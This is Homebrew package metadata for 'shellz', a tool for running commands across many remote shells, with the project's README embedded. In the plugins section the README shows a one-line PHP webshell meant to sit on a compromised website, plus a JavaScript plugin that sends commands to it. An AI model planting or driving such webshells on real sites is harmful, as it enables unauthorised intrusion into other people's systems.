{
  "name": "shellz",
  "full_name": "shellz",
  "tap": "homebrew/core",
  "oldname": null,
  "oldnames": [],
  "aliases": [],
  "versioned_formulae": [],
  "desc": "Small utility to track and control custom shellz",
  "license": "GPL-3.0-only",
  "homepage": "https://github.com/evilsocket/shellz",
  "versions": {
    "stable": "1.6.0",
    "head": null,
    "bottle": true
  },
  "urls": {
    "stable": {
      "url": "https://github.com/evilsocket/shellz/archive/v1.6.0.tar.gz",
      "tag": null,
      "revision": null,
      "checksum": "3a89e3d573563a0c2ccb1831ff41fc0204c8b4efb011c10108ab98451a309b1c"
    }
  },
  "revision": 0,
  "version_scheme": 0,
  "bottle": {
    "stable": {
      "rebuild": 0,
      "root_url": "https://ghcr.io/v2/homebrew/core",
      "files": {
        "arm64_ventura": {
          "cellar": ":any_skip_relocation",
          "url": "https://ghcr.io/v2/homebrew/core/shellz/blobs/sha256:f988ca6178c77343dfea20c9b4adf2eb0742605f4e0402dac2e2ad963ab5881c",
          "sha256": "f988ca6178c77343dfea20c9b4adf2eb0742605f4e0402dac2e2ad963ab5881c"
        },
        "arm64_monterey": {
          "cellar": ":any_skip_relocation",
          "url": "https://ghcr.io/v2/homebrew/core/shellz/blobs/sha256:ac21c3ae7ea28b170bf5b3eb29b70ea61c512060807833de7ef1723a66316f6b",
          "sha256": "ac21c3ae7ea28b170bf5b3eb29b70ea61c512060807833de7ef1723a66316f6b"
        },
        "arm64_big_sur": {
          "cellar": ":any_skip_relocation",
          "url": "https://ghcr.io/v2/homebrew/core/shellz/blobs/sha256:e4ea721956ec5e9a51e8774000f17eca688fdf50c1d41496b23f2be90bec65c8",
          "sha256": "e4ea721956ec5e9a51e8774000f17eca688fdf50c1d41496b23f2be90bec65c8"
        },
        "ventura": {
          "cellar": ":any_skip_relocation",
          "url": "https://ghcr.io/v2/homebrew/core/shellz/blobs/sha256:3145d8638bc906488ffff093a2d53829df20b80a48403d10c71e30d9ed3f4b89",
          "sha256": "3145d8638bc906488ffff093a2d53829df20b80a48403d10c71e30d9ed3f4b89"
        },
        "monterey": {
          "cellar": ":any_skip_relocation",
          "url": "https://ghcr.io/v2/homebrew/core/shellz/blobs/sha256:fee1186791c0b7af5f978cd5170e0c1b1820cff57828e05d7b2274f93ff8f5f4",
          "sha256": "fee1186791c0b7af5f978cd5170e0c1b1820cff57828e05d7b2274f93ff8f5f4"
        },
        "big_sur": {
          "cellar": ":any_skip_relocation",
          "url": "https://ghcr.io/v2/homebrew/core/shellz/blobs/sha256:cc03abb302fea67ca26f25d3d5835ef5480865a77838ef84c02e652f89809d9a",
          "sha256": "cc03abb302fea67ca26f25d3d5835ef5480865a77838ef84c02e652f89809d9a"
        },
        "catalina": {
          "cellar": ":any_skip_relocation",
          "url": "https://ghcr.io/v2/homebrew/core/shellz/blobs/sha256:5909f7cc0f0bfce0ad949965618ebf4a8cbdd022571bb89cfa44645d28dd72b0",
          "sha256": "5909f7cc0f0bfce0ad949965618ebf4a8cbdd022571bb89cfa44645d28dd72b0"
        },
        "mojave": {
          "cellar": ":any_skip_relocation",
          "url": "https://ghcr.io/v2/homebrew/core/shellz/blobs/sha256:d5a64a93fe05d1560dacb91290a5f77321d01872a8b4eb413823eadb92c74044",
          "sha256": "d5a64a93fe05d1560dacb91290a5f77321d01872a8b4eb413823eadb92c74044"
        },
        "x86_64_linux": {
          "cellar": ":any_skip_relocation",
          "url": "https://ghcr.io/v2/homebrew/core/shellz/blobs/sha256:562f9886f5574cec74ea7419dfb9e7ffc88cddf253da7971744781c115f0a0f7",
          "sha256": "562f9886f5574cec74ea7419dfb9e7ffc88cddf253da7971744781c115f0a0f7"
        }
      }
    }
  },
  "keg_only": false,
  "keg_only_reason": null,
  "options": [],
  "build_dependencies": [
    "go"
  ],
  "dependencies": [],
  "test_dependencies": [],
  "recommended_dependencies": [],
  "optional_dependencies": [],
  "uses_from_macos": [],
  "uses_from_macos_bounds": [],
  "requirements": [],
  "conflicts_with": [],
  "conflicts_with_reasons": [],
  "link_overwrite": [],
  "caveats": null,
  "installed": [],
  "linked_keg": null,
  "pinned": false,
  "outdated": false,
  "deprecated": false,
  "deprecation_date": null,
  "deprecation_reason": null,
  "disabled": false,
  "disable_date": null,
  "disable_reason": null,
  "post_install_defined": false,
  "service": null,
  "tap_git_head": "4eeae4ea50839e967536ba646d5e0ed6fbcbad7f",
  "ruby_source_path": "Formula/shellz.rb",
  "ruby_source_checksum": {
    "sha256": "5fc8df8c43ac8e3e886cb7c60bd744eabcdde2f26fda25c4b727ed5670357a76"
  },
  "date_added": "2018-10-24T22:37:31+10:00",
  "readme": "<p align=\"center\">\n  <img alt=\"shellz\" src=\"https://raw.githubusercontent.com/evilsocket/shellz/master/logo.png\" />\n  <p align=\"center\">\n    <a href=\"https://github.com/evilsocket/shellz/releases/latest\"><img alt=\"Release\" src=\"https://img.shields.io/github/release/evilsocket/shellz.svg?style=flat-square\"></a>\n    <a href=\"https://github.com/evilsocket/shellz/blob/master/LICENSE.md\"><img alt=\"Software License\" src=\"https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square\"></a>\n    <a href=\"https://travis-ci.org/evilsocket/shellz\"><img alt=\"Travis\" src=\"https://img.shields.io/travis/evilsocket/shellz/master.svg?style=flat-square\"></a>\n    <a href=\"https://goreportcard.com/report/github.com/evilsocket/shellz\"><img alt=\"Go Report Card\" src=\"https://goreportcard.com/badge/github.com/evilsocket/shellz?style=flat-square&fuckgithubcache=1\"></a>\n  </p>\n</p>\n\n`shellz` is a small utility to manage your `ssh`, `telnet`, `kubernetes`, `winrm`, `web` or any custom shell in a single place. \n\nThis means that with a single tool with a simple command line, you will be able to execute shell commands on any of those systems transparently, so that you can, for instance, check the uptime of all your systems, whether it is a Windows machine, a Kubernetes pod, an SSH server or a Raspbery Pi like [shown in this demo](https://www.youtube.com/watch?v=ZjMRbUhw9z4).\n\n## Installation\n\nA [precompiled version is available for each release](https://github.com/evilsocket/shellz/releases), alternatively you can use the latest version of the source code from this repository in order to build your own binary.\n\n### From Sources\n\nMake sure you have a correctly configured **Go >= 1.8** environment, that `$GOPATH/bin` is in `$PATH` and then:\n\n    $ go get -u github.com/evilsocket/shellz/cmd/shellz\n\nThis command will download shellz, install its dependencies, compile it and move the `shellz` executable to `$GOPATH/bin`.\n\n## How to Use\n\nThe tool will use the `~/.shellz` folder to load your identities and shells json files, running the command `shellz` the first time will create the folder and the `idents` and `shells` subfolders for you. Once both `~/.shellz/idents` and `~/.shellz/shells` folders have been created, you can start by creating your first identity json file, for instance let's create `~/.shellz/idents/default.json` with the following contents:\n\n```json\n{\n    \"name\": \"default\",\n    \"username\": \"evilsocket\",\n    \"key\": \"~/.ssh/id_rsa\"\n}\n```\n\nAs you can see my `default` identity is using my SSH private key to log in the `evilsocket` user, alternatively you can specify a `\"password\"` field instead of a `\"key\"`. Alternatively, you can set the `\"key\"` field to `\"@agent\"`, in which case shellz will ask the ssh-agent for authentication details to the remote host:\n\n```json\n{\n    \"name\": \"default\",\n    \"username\": \"evilsocket\",\n    \"key\": \"@agent\"\n}\n```\n\n### SSH \n\nNow let's create our first shell json file ( `~/.shellz/shells/media.json` ) that will use the `default` identity we just created to connect to our home media server (called `media.server` in our example):\n\n```json\n{\n    \"name\": \"media-server\",\n    \"host\": \"media.server\",\n    \"groups\": [\"servers\", \"media\", \"whatever\"],\n    \"port\": 22,\n    \"identity\": \"default\"\n}\n```\n\n### Telnet\n\n```sh\ncat ~/.shellz/shells/tnas.json\n```\n\n```json\n{\n    \"name\": \"tnas\",\n    \"host\": \"tnas.local\",\n    \"port\": 23,\n    \"identity\": \"admin-tnas\",\n    \"type\": \"telnet\"\n}\n```\n\n### WinRM\n\n\n```sh\ncat ~/.shellz/shells/win.json\n```\n\n```json\n{\n    \"name\": \"win10\",\n    \"host\": \"win10.local\",\n    \"port\": 5986,\n    \"identity\": \"admin-win10\",\n    \"type\": \"winrm\",\n    \"https\": true,\n    \"insecure\": false\n}\n```\n\n### Kubernetes \n\n```sh\ncat ~/.shellz/shells/kube-pod.json\n```\n\n```json\n{\n  \"name\": \"kube-microbot\",\n  \"host\": \"https://127.0.0.1:16443\",\n  \"type\": \"kube\",\n  \"namespace\": \"default\",\n  \"pod\": \"microbot-5f5499d479-qp9z7\",\n  \"groups\": [\n    \"kube\",\n    \"cluster\"\n  ],\n  \"identity\": \"microk8s\",\n}\n```\n\nWhere the host field must point to the Kubernetes control plane URL obtained with:\n\n    kubectl cluster-info | grep control \n\n```sh\ncat ~/.shellz/idents/microk8s.json\n```\n\n```json\n{\n    \"name\": \"microk8s\",\n    \"key\": \"~/.microk8s-bearer-token\"\n}\n```\n\nWhere the `~/.microk8s-bearer-token` file must contain the bearer token obtained with:\n\n    token=$(kubectl -n kube-system get secret | grep default-token | cut -d \" \" -f1)\n    kubectl -n kube-system describe secret $token | grep \"token:\"    \n\n### SOCKS5\n\nIf you wish to use a SOCKS5 proxy (supported for the `ssh` session and custom shells), for instance to reach a shell on a TOR hidden service, you can use the `\"proxy\"` configuration object:\n\n```json\n{\n  \"name\": \"my-tor-shell\",\n  \"host\": \"whateverwhateveroihfdwoeghfd.onion\",\n  \"port\": 22,\n  \"identity\": \"default\",\n  \"proxy\": {\n    \"address\": \"127.0.0.1\",\n    \"port\": 9050,\n    \"username\": \"this is an optional field\",\n    \"password\": \"this is an optional field\"\n  }\n}\n```\n\n### Using Groups \n\nShells can (optionally) be grouped (with a default `all` group containing all of them) and, by default, they are considered `ssh`, in which case you can also specify the ciphers your server supports:\n\n\n```json\n{\n    \"name\": \"old-server\",\n    \"host\": \"old.server\",\n    \"groups\": [\"servers\", \"legacy\"],\n    \"port\": 22,\n    \"identity\": \"default\",\n    \"ciphers\": [\"aes128-cbc\", \"3des-cbc\"]\n}\n```\n    \n### Reverse Tunnels\n\n`shellz` can be used for starting reverse SSH tunnels, for instance, let's create the `~/.shellz/shells/mytunnel.json` file:\n\n```json\n{\n    \"name\": \"my.tunnel\",\n    \"host\": \"example.com\",\n    \"tunnel\": {\n        \"local\": {\n            \"address\": \"127.0.0.1\",\n            \"port\": 8443\n        },\n        \"remote\": {\n            \"address\": \"192.168.1.1\",\n            \"port\": 443\n        }\n    }\n}\n```\n\nBy running the following command:\n\n    shellz -tunnel -on my.tunnel\n\nThe remote endpoint `https://192.168.1.1` will be tunneled by `example.com` and available on your computer at `https://localhost:8443`.\n\n### Plugins\n\nInstead of one of the supported types, you can specify a custom name, in which case shellz will use an external plugin. \n\nLet's start by creating a new shell json file `~/.shellz/shells/custom.json` with the following contents:\n\n```json\n{\n    \"name\": \"custom\",\n    \"host\": \"http://www.imvulnerable.gov/uploads/sh.php\",\n    \"identity\": \"empty\",\n    \"port\": 80,\n    \"type\": \"mycustomshell\"\n}\n```\n\nAs you probably noticed, the `host` field is the full URL of a very simple PHP webshell uploaded on some website:\n\n```php\n<?php system($_REQUEST[\"cmd\"]); die; ?>\n```\n\nAlso, the `type` field is set to `mycustomshell`, in this case `shellz` will try to load the file `~/.shellz/plugins/mycustomshell.js` and use it to create a session and execute a command. \n\nA `shellz` plugin must export the `Create`, `Exec` and `Close` functions, this is how `mycustomshell.js` looks like:\n\n```js\nvar headers = {\n    'User-Agent': 'imma-shellz-plugin'\n};\n\n/*\n * The Create callback is called whenever a new command has been queued\n * for execution and the session should be initiated, in this case we \n * simply return the main shell object, but it might be used to connect\n * to the endpoint and store the socket on a more complex Object.\n */\nfunction Create(sh) {\n    log.Debug(\"Create(\" + sh + \")\");\n    return sh;\n}\n\n/*\n * Exec is called for each command, the first argument is the object\n * returned from the Create callback, while the second is a string with the\n * command itself.\n */\nfunction Exec(sh, cmd) {\n    log.Debug(\"running \" + cmd + \" on \" + sh.Host);\n    /* \n     * OR\n     *\n     * var resp = http.Post(sh.Host, headers, {\"cmd\":cmd});\n     */\n    var resp = http.Get(sh.Host + \"?cmd=\" + cmd, headers)\n    if( resp.Error ) {\n        log.Error(\"error while running \" + cmd + \": \" + resp.Error);\n        return resp.Error;\n    }\n    return resp.Raw;\n}\n\n/*\n * Used to finalize the state of the object (close sockets, etc).\n */\nfunction Close(sh) {\n    log.Debug(\"Close(\" + sh + \")\");\n}\n```\n\nTo use a SOCKS5 proxy with the `http` object:\n\n```js\nvar proxied = http.WithProxy(\"127.0.0.1\", 9050, \"optional username\", \"optional password\");\n\nproxied.Get(...);\n```\n\nOther than the `log` interface and the `http` client, also a `tcp` client is available with the following API:\n\n```js\n// this will create the client\nvar c = tcp.Connect(\"1.2.3.4:80\");\nif( c == null ) {\n    log.Error(\"could not connect!\");\n    return;\n}\n\n// send some bytes\nc.Write(\"somebyteshere\");\n\n// read some bytes until a newline\nvar ret = c.ReadUntil(\"\\n\");\nif( ret.Error != null ) {\n    log.Error(\"error while reading: \" + err);\n} else {\n    // print results\n    log.Info(\"res=\" + ret.Raw);\n}\n\n// always close the socket\nc.Close();\n```\n\n### Examples\n\nList available identities, plugins and shells:\n\n    shellz -list\n\nList all available identities and shells of the group web:\n\n    shellz -list -on web\n\nEnable the shells named machineA and machineB:\n\n    shellz -enable machineA, machineB\n\nEnable shells of the group `web`:\n\n    shellz -enable web\n\nDisable the shell named machineA (commands won't be executed on it):\n\n    shellz -disable machineA\n\nTest all shells and disable the not responding ones:\n\n    shellz -test\n\nTest two shells and disable them if they don't respond within 1 second:\n\n    shellz -test -on \"machineA, machineB\" -connection-timeout 1s\n\nRun the command `id` on each shell ( with `-to` default to `all`):\n\n    shellz -run id\n\nRun the command 'id' on each shell and print some statistics once finished:\n\n    shellz -run id -stats\n\nRun the command `id` on a single shell named `machineA`:\n\n    shellz -run id -on machineA\n\nRun the command `id` on `machineA` and `machineB`:\n\n    shellz -run id -on 'machineA, machineB'\n\nRun the command `id` on shells of group `web`:\n\n    shellz -run id -on web\n\nRun the command `uptime` on every shell and append all outputs to the `all.txt` file:\n\n    shellz -run uptime -to all.txt\n\nRun the command `uptime` on every shell and save each outputs to a different file using per-shell data (every field referenced between `{{` and `}}` will be replaced by the json field of the [shell object](https://github.com/evilsocket/shellz/blob/master/models/shell.go#L23)):\n\n    shellz -run uptime -to \"{{.Identity.Username}}_{{.Name}}.txt\"\n\nStart a ssh reverse tunnel:\n\n    shellz -tunnel -on some-tunnel\n\nFor a list of all available flags and some usage examples just type `shellz` without arguments.\n\n## License\n\nShellz was made with â™¥  by [Simone Margaritelli](https://www.evilsocket.net/) and it's released under the GPL 3 license."
}
